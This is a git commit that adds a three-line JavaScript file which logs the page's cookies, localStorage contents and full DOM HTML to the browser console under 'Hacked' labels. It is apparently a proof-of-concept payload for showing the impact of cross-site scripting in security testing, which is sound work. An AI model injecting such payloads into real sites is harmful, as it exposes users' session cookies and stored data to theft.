abb8c5b1624e13a0a722acbf52df244ccb20fd5f
TakSec <michaeljtakahashi@gmail.com>
2023-03-25 16:58:27 -0700

    Create log-cookies-storage-dom.js

---
+++ log-cookies-storage-dom.js
@@ -0,0 +1,3 @@
+console.log(`%cHacked Cookies: %c${document.cookie}`, 'color: red', 'color: blue');
+console.log(`%cHacked Local Storage: %c${JSON.stringify(localStorage)}`, 'color: red', 'color: blue');
+console.log(`%cHacked DOM Contents: %c${document.documentElement.innerHTML}`, 'color: red', 'color: blue');
